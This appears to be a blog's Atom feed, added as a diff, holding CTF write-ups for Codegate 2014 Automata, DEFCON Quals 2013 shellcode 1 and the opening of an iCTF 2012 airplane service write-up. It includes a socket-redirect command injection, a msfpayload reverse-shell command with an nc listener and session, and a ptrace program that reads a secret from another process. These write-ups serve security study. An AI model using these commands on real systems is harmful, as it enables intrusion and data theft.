@@ -1,0 +1,367 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>rep.github.com</title><link href="/" rel="alternate"></link><link href="/feeds/blog.atom.xml" rel="self"></link><id>/</id><updated>2014-02-26T20:00:00+01:00</updated><entry><title>Codegate CTF 2014 Automata - RE 400</title><link href="/codegate-2014-automata-re400.html" rel="alternate"></link><updated>2014-02-26T20:00:00+01:00</updated><author><name>Mark "rep" Schloesser</name></author><id>tag:,2014-02-26:codegate-2014-automata-re400.html</id><summary type="html">&lt;p&gt;Automata is a 32 bit Linux ELF binary and listens on a TCP port on the organizer network - one basically has to exploit it. However the binary just wants a command and a verification code as input - and if the code is correct for the given command, it will execute the command.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;[*] Enter your command: ls
+[*] Enter your code: code
+[!] Wrong code
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="section" id="reversing-automata"&gt;
+&lt;h2&gt;Reversing Automata&lt;/h2&gt;
+&lt;p&gt;The binary is relatively simple, it uses the standard forking socket server template common in many CTF services. In the actual service logic, it sends the instructions to the client and receives the command and code. For both it uses one &lt;tt class="docutils literal"&gt;recv(51)&lt;/tt&gt; call and ends the buffer with a null-byte. Afterwards it calls &lt;tt class="docutils literal"&gt;strtok(buf, &amp;quot; &lt;span class="pre"&gt;\t\r\n\&amp;quot;'&amp;quot;)&lt;/span&gt;&lt;/tt&gt; on the resulting buffer, which overwrites the first delimiter with a null-byte, so that basically neither command nor code can have any whitespace in them.&lt;/p&gt;
+&lt;p&gt;After receiving the inputs, a first verification stage occurs. For this, the command is checked with this function:&lt;/p&gt;
+&lt;div class="system-message"&gt;
+&lt;p class="system-message-title"&gt;System Message: ERROR/3 (&lt;tt class="docutils"&gt;/home/rep/code/rep.github.com/pelican-new/content/codegate-2014-automata-re400.rst&lt;/tt&gt;, line 26)&lt;/p&gt;
+&lt;p&gt;Content block expected for the &amp;quot;code-block&amp;quot; directive; none found.&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+.. code-block:: c
+        check_command(const char *cmd, int *output) {
+          tmp = 0;
+          for ( i = strlen(cmd); i &amp;gt; 0; --i )
+            tmp = 37 * (tmp + cmd[i - 1]);
+          output[1] = tmp % 0x11 + 1;
+          output[2] = (tmp &amp;amp; 0xF) + 1;
+          output[0] = 43 - output[1] - output[2];
+        }
+
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;It basically calculates 3 numbers, which are important for the next part - the verification code needs to have an appropriate number of characters in it:&lt;/p&gt;
+&lt;div class="system-message"&gt;
+&lt;p class="system-message-title"&gt;System Message: ERROR/3 (&lt;tt class="docutils"&gt;/home/rep/code/rep.github.com/pelican-new/content/codegate-2014-automata-re400.rst&lt;/tt&gt;, line 38)&lt;/p&gt;
+&lt;p&gt;Content block expected for the &amp;quot;code-block&amp;quot; directive; none found.&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+.. code-block:: c
+  count_3 = 0; count_2 = 0; count_1 = 0;
+  for ( i = 0; i &amp;lt; strlen(code); ++i ) {
+    m = code[i] % 16;
+    if ( m == 2 )
+      ++count_2;
+    else {
+      if ( m == 3 )
+        ++count_3;
+      else {
+        if ( m != 1 )
+          wrong_code_do_exit(socketfd);
+        ++count_1;
+      }
+    }
+  }
+  if ( command_check[0] != count_1 || command_check[1] != count_2 || command_check[2] != count_3 )
+    wrong_code_do_exit(socketfd);
+
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;What this means is that the verification code needs to have an appropriate amount of &lt;tt class="docutils literal"&gt;a, b, c&lt;/tt&gt; characters in it for the previously computed numbers on the command.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="the-automaton"&gt;
+&lt;h2&gt;The Automaton&lt;/h2&gt;
+&lt;p&gt;After the initial verification stage, the more complicated part is reached. The binary creates subprocesses and pipes, sets up signal handling for signals 10 and 12 and then sits in a tight loop. The subprocesses and pipes represent the automaton - basically the processes are states and transitions occur by writing a number through the pipes.&lt;/p&gt;
+&lt;p&gt;Automaton creates 8 subprocesses and 20 pipes.&lt;/p&gt;
+&lt;p&gt;Each process reads from a few pipes (1-5) and writes to one of three output pipes. The automaton basically takes the code received earlier as input. The characters &lt;tt class="docutils literal"&gt;a,b,c&lt;/tt&gt; in the code make the automaton transition from state to state.&lt;/p&gt;
+&lt;p&gt;It turns out that the parent will execute the command if it receives signal 10 and just says &lt;tt class="docutils literal"&gt;Wrong code&lt;/tt&gt; and exits on signal 12. The signal is sent by either of the child processes when the character at position 43 in the code is processed. All subprocesses use signal 10, except for the last process (number 8). So that last process #8 represents the end-state and we need to make sure that we do not enter that state with our input because it turns out that state 8 will only transition to itself.&lt;/p&gt;
+&lt;a class="reference external image-reference" href="pictures/automaton_drawing.png"&gt;&lt;img alt="automaton drawing" class="align-center" src="pictures/automaton_drawing.png" style="width: 400px; height: 300px;" /&gt;&lt;/a&gt;
+&lt;/div&gt;
+&lt;div class="section" id="command-and-code"&gt;
+&lt;h2&gt;Command and Code&lt;/h2&gt;
+&lt;p&gt;Alright so we need to figure out a command that will get us the key and we can't have any whitespace in there. However as it is a forking socket-server, the socket fd will be the same number in every child - it is fd &lt;tt class="docutils literal"&gt;4&lt;/tt&gt;. So how about &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;cat&amp;lt;key&amp;gt;&amp;amp;4&lt;/span&gt;&lt;/tt&gt; - this will be executed by automata through the &lt;tt class="docutils literal"&gt;system()&lt;/tt&gt; library function - inherits the parent descriptors and thus gives us the key.&lt;/p&gt;
+&lt;p&gt;We determine the amount of &lt;tt class="docutils literal"&gt;a,b,c&lt;/tt&gt; characters needed for the first verification step: 39 As, 2 Bs and 2 Cs&lt;/p&gt;
+&lt;p&gt;Then we look at our drawing and figure out an order that stays away from state 8: &lt;tt class="docutils literal"&gt;cabcaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab&lt;/tt&gt;&lt;/p&gt;
+&lt;p&gt;Fingers crossed and fire:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;[*] Enter your command: cat&amp;lt;key&amp;gt;&amp;amp;4
+[*] Enter your code: cabcaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+[*] Verifying your code
+[!] Registered
+F4ILUrE_Is_N0T_an_O0PtI1On
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This challenge was pretty cool - the reversing was relatively simple, but the states and pipe numbers had to be kept track off in a very exact way. I swapped around two transitions on my sheet of paper and it took me an hour to figure that out :)&lt;/p&gt;
+&lt;p&gt;Anyway, good fun!&lt;/p&gt;
+&lt;blockquote&gt;
+-- mark&lt;/blockquote&gt;
+&lt;/div&gt;
+</summary><category term="ctf"></category><category term="reversing"></category><category term="codegate"></category></entry><entry><title>DEFCON CTF Quals 2013 - shellcode 1</title><link href="/defcon-ctf-quals-2013-sc1.html" rel="alternate"></link><updated>2013-06-17T08:00:00+02:00</updated><author><name>Mark "rep" Schloesser</name></author><id>tag:,2013-06-17:defcon-ctf-quals-2013-sc1.html</id><summary type="html">&lt;p&gt;It was DEFCON Quals time again - this time with a new organizer: &lt;a class="reference external" href="http://legitbs.net/"&gt;Legit Business Syndicate&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We solved quite a few challenges and collected 48 points - this sadly was not enough to bring us into the top of the scoreboard, though.&lt;/p&gt;
+&lt;p&gt;One of the first challenges I worked on was shellcode 1 aka &lt;tt class="docutils literal"&gt;incest&lt;/tt&gt;. This was a set of two 64 bit binaries that basically executed shellcode directly and read in the key file before - but with a twist. So here is the short write-up, even though it was not a very complicated challenge. We will save the more interesting write-ups for later :)&lt;/p&gt;
+&lt;div class="section" id="the-wrapper-maw"&gt;
+&lt;h2&gt;The wrapper - &lt;tt class="docutils literal"&gt;maw&lt;/tt&gt;&lt;/h2&gt;
+&lt;p&gt;The main service binary is called &lt;tt class="docutils literal"&gt;maw&lt;/tt&gt; and does the usual listen-socket wrapping as shown in the screenshot below. However it also opens the key file and for handling the accepted client actually executes another binary called &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt; and tells it about the client socket fd and the open fd to the key file.&lt;/p&gt;
+&lt;a class="reference external image-reference" href="pictures/maw.png"&gt;&lt;img alt="maw disassembly" class="align-center" src="pictures/maw.png" style="width: 400px; height: 300px;" /&gt;&lt;/a&gt;
+&lt;/div&gt;
+&lt;div class="section" id="the-handler-sis"&gt;
+&lt;h2&gt;The handler - &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt;&lt;/h2&gt;
+&lt;p&gt;The &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt; binary is small and simple - it basically takes the fds from its arguments, then forks and the parent will read in the keyfile content and wait for a bit (15 seconds) and the child will read from the socket and jump into the received data - thus basically executing our sent shellcode.&lt;/p&gt;
+&lt;a class="reference external image-reference" href="pictures/sis.png"&gt;&lt;img alt="sis disassembly" class="align-center" src="pictures/sis.png" style="width: 400px; height: 300px;" /&gt;&lt;/a&gt;
+&lt;p&gt;Thus the twist is that even with our shellcode running we can not see the key in memory, as it is only available in the other process. We thought that spawning a shell and attaching to that other process with a debugger would get the job done.&lt;/p&gt;
+&lt;p&gt;Alright, generate shellcode, send it over.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfpayload linux/x64/shell_reverse_tcp LHOST=?.?.?.? LPORT=4445 R &amp;gt; shellcode.bin
+
+nc incest.shallweplayaga.me 65535 &amp;lt; shellcode.bin
+
+$ nc -vnlp 4445
+listening on [any] 4445 ...
+connect to [?.?.?.?] from (UNKNOWN) [54.224.177.78] 56776
+id
+uid=1001(maw) gid=1001(maw) groups=1001(maw)
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Looking at the code of how the parent &lt;tt class="docutils literal"&gt;sis&lt;/tt&gt; reads in the keyfile we can see that it allocates a buffer and writes its address to rbp-0x18 - so that should still be valid even during the sched_yield loop.
+Sadly at this point we had some problems attaching with gdb and thus did retrieve the key with a small ptrace binary of our own. I compiled the following code and copied it over to the service machine's tmp folder.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+    &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;ptr_keystring&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;retval&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;user_regs_struct&lt;/span&gt; &lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+
+    &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_ATTACH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_GETREGS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;ptr_keystring&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_PEEKTEXT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x18&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;regs pid %d rbp %p val@rbp-0x18 %lx&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uregs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ptr_keystring&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;=&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;retval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_PEEKTEXT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ptr_keystring&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;read %lx -&amp;gt; %lx&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ptr_keystring&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;swap_int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;retval&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;ptrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PTRACE_DETACH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This basically attaches to the pid, gets the registers in order to know rbp, and then retrieves the address of the keyfile content buffer from rbp-0x18. Several PEEKs later we should have the key...&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;connect to [?.?.?.?] from (UNKNOWN) [54.224.177.78] 56783
+/tmp/.oldeurope/pt $(cat /proc/$$/status | grep PPid | awk &amp;#39;{print $2}&amp;#39;)
+regs pid 2196 rbp 0x7fff97ef83b0 val@rbp-0x18 15ed010
+read 15ed010 -&amp;gt; 546865206b657920
+read 15ed018 -&amp;gt; 69733a206b333370
+read 15ed020 -&amp;gt; 20697420696e2074
+read 15ed028 -&amp;gt; 68652066616d696c
+read 15ed030 -&amp;gt; 790a000000000000
+read 15ed038 -&amp;gt; d10f020000000000
+read 15ed040 -&amp;gt; 0
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now just print those hexdigits as ASCII:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;546865206b65792069733a206b33337020697420696e207468652066616d696c790a000000000000&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="s"&gt;&amp;#39;The key is: k33p it in the family&lt;/span&gt;&lt;span class="se"&gt;\n\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This was definitely a relatively easy challenge - not really about crafting shellcode, but nevertheless the twist of retrieving the key from the parent process was quite nice!&lt;/p&gt;
+&lt;p&gt;More write-ups to come soon...&lt;/p&gt;
+&lt;blockquote&gt;
+-- mark&lt;/blockquote&gt;
+&lt;/div&gt;
+</summary><category term="ctf"></category><category term="exploit"></category><category term="defcon"></category><category term="quals"></category></entry><entry><title>UCSB iCTF 2012/2013 - Airplane</title><link href="/ictf-2012-airplane-exploit.html" rel="alternate"></link><updated>2013-03-23T20:00:00+01:00</updated><author><name>Mark "rep" Schloesser</name></author><id>tag:,2013-03-23:ictf-2012-airplane-exploit.html</id><summary type="html">&lt;p&gt;This write-up walks through the steps we took to finally end up with a working exploit for the &lt;a class="reference external" href="http://ictf.cs.ucsb.edu/"&gt;UCSB iCTF 2012&lt;/a&gt; (2013) &amp;quot;airplane&amp;quot; service.&lt;/p&gt;
+&lt;p&gt;The CTF was postponed from normally being run in early December to March 22nd. I participated again with the &lt;a class="reference external" href="http://ctf.itsec.rwth-aachen.de/"&gt;0ldEur0pe&lt;/a&gt; team - with base of operations in the UMIC Research Center in Aachen.&lt;/p&gt;
+&lt;div class="section" id="overview-the-airplane-service"&gt;
+&lt;h2&gt;Overview - the &lt;tt class="docutils literal"&gt;airplane&lt;/tt&gt; service&lt;/h2&gt;
+&lt;p&gt;The &lt;tt class="docutils literal"&gt;airplane&lt;/tt&gt; service is written in Python and uses a ASCII, line-based request-response protocol for communicating with clients. It represents a airplane flight management system with an added storage for key-value pairs - here flagid-flag pairs.&lt;/p&gt;
+&lt;p&gt;The service files are residing in &lt;tt class="docutils literal"&gt;/home/airplane/service/&lt;/tt&gt; and it is started through its &lt;tt class="docutils literal"&gt;run.sh&lt;/tt&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;
+./air-control.py -p 7331 &amp;amp;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The other files belonging to the service were:&lt;/p&gt;
+&lt;p&gt;Service Files:&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+service/worldmap.py             - dictionary of cities and their geo-locations
+service/output.py               - logging / debug class
+service/handle.py               - main connection handling code, slightly obfuscated
+service/cairplane_database.py   - initialize and wrap airplane objects
+service/utils.py                - utility functions - most importantly ComputeSign
+service/air-control.py          - ThreadedTCPRequestHandler - and some handling logic
+service/cairplane.py            - airplane class, init GetKey / GetPosition / SetPosition
+service/password.py             - service secrets - used by gameserver and for signing requests/responses
+&lt;/pre&gt;
+&lt;p&gt;We can also take a look at one of the conversations of the gameserver to this service. I'll add [[SERVER]] and [[CLIENT]] before the requests/responses.&lt;/p&gt;
+&lt;p&gt;Conversation:&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+[[CLIENT]]
+CODE=LIST
+
+[[SERVER]]
+A_0009=FLIGHT &amp;quot;A_0009&amp;quot;: pos=[631,402] orig=&amp;quot;Hong Kong&amp;quot;([813,87]) dest=&amp;quot;Jakarta&amp;quot;([355,886])
+A_0019=FLIGHT &amp;quot;A_0019&amp;quot;: pos=[259,633] orig=&amp;quot;Phnom Penh&amp;quot;([87,798]) dest=&amp;quot;Kiev&amp;quot;([341,556])
+A_0021=FLIGHT &amp;quot;A_0021&amp;quot;: pos=[673,620] orig=&amp;quot;Belgrade&amp;quot;([737,357]) dest=&amp;quot;Ankara&amp;quot;([624,828])
+A_0031=FLIGHT &amp;quot;A_0031&amp;quot;: pos=[559,435] orig=&amp;quot;Vienna&amp;quot;([449,109]) dest=&amp;quot;Tripoli&amp;quot;([737,960])
+A_0043=FLIGHT &amp;quot;A_0043&amp;quot;: pos=[560,435] orig=&amp;quot;Auckland&amp;quot;([192,450]) dest=&amp;quot;Tokyo&amp;quot;([612,434])
+A_0056=FLIGHT &amp;quot;A_0056&amp;quot;: pos=[193,771] orig=&amp;quot;Phnom Penh&amp;quot;([87,798]) dest=&amp;quot;Singapore&amp;quot;([683,650])
+A_0066=FLIGHT &amp;quot;A_0066&amp;quot;: pos=[371,824] orig=&amp;quot;Melbourne&amp;quot;([992,616]) dest=&amp;quot;Port-au-Prince&amp;quot;([249,866])
+A_0071=FLIGHT &amp;quot;A_0071&amp;quot;: pos=[728,652] orig=&amp;quot;Phoenix&amp;quot;([984,538]) dest=&amp;quot;Port-au-Prince&amp;quot;([249,866])
+A_0089=FLIGHT &amp;quot;A_0089&amp;quot;: pos=[455,815] orig=&amp;quot;Phoenix&amp;quot;([984,538]) dest=&amp;quot;Kabul&amp;quot;([236,930])
+A_0098=FLIGHT &amp;quot;A_0098&amp;quot;: pos=[399,870] orig=&amp;quot;Kabul&amp;quot;([236,930]) dest=&amp;quot;Hanoi&amp;quot;([963,663])
+A_0102=FLIGHT &amp;quot;A_0102&amp;quot;: pos=[696,474] orig=&amp;quot;New York&amp;quot;([807,281]) dest=&amp;quot;Antananarivo&amp;quot;([476,859])
+A_0114=FLIGHT &amp;quot;A_0114&amp;quot;: pos=[716,671] orig=&amp;quot;Phnom Penh&amp;quot;([87,798]) dest=&amp;quot;Melbourne&amp;quot;([992,616])
+CODE=OK
+FLAG=FLGj2WtCX7CMWjlQ
+
+[[CLIENT]]
+CODE=LIST
+ID=A_0114
+RAND=.6..FS.O
+SIGN=2638147f
+
+[[SERVER]]
+CODE=ERROR
+RAND=!m..A...
+SIGN=7484546c
+
+[[CLIENT]]
+CODE=SETPOS
+FGID=185
+ID=A_0102
+POSX=692
+POSY=480
+RAND=g.'..u..
+SIGN=aac05b95
+
+[[SERVER]]
+CODE=OK
+RAND=?.M.'3..
+SIGN=1825f45d
+FLAG=FLGrK8C5stGDHv74
+&lt;/pre&gt;
+&lt;p&gt;Alright, so basically the service keeps track of airplanes together with their flight origin, destination and current position. For certain actions it uses authenticated (well...) requests and responses - for example to update flight positions.&lt;/p&gt;
+&lt;p&gt;Also it has a part of functionality that allows only the gameserver to store and retrieve flags which is not shown here.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="diving-into-the-service-functionality"&gt;
+&lt;h2&gt;Diving into the service functionality&lt;/h2&gt;
+&lt;p&gt;The &lt;tt class="docutils literal"&gt;ThreadedTCPRequestHandler&lt;/tt&gt; will be started on the port given on the command-line. It hands of first processing to the handle function inside the &lt;tt class="docutils literal"&gt;handle.py&lt;/tt&gt; module.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;handle&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ThreadedTCPRequestHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SocketServer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BaseRequestHandler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__HandleList&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AirplaneDatabase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dicData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Answer&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__HandleSetPos&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AirplaneDatabase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dicData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Answer&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;HandleData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AirplaneDatabase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;szData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Answer&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;span class="c"&gt;# [...]&lt;/span&gt;
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
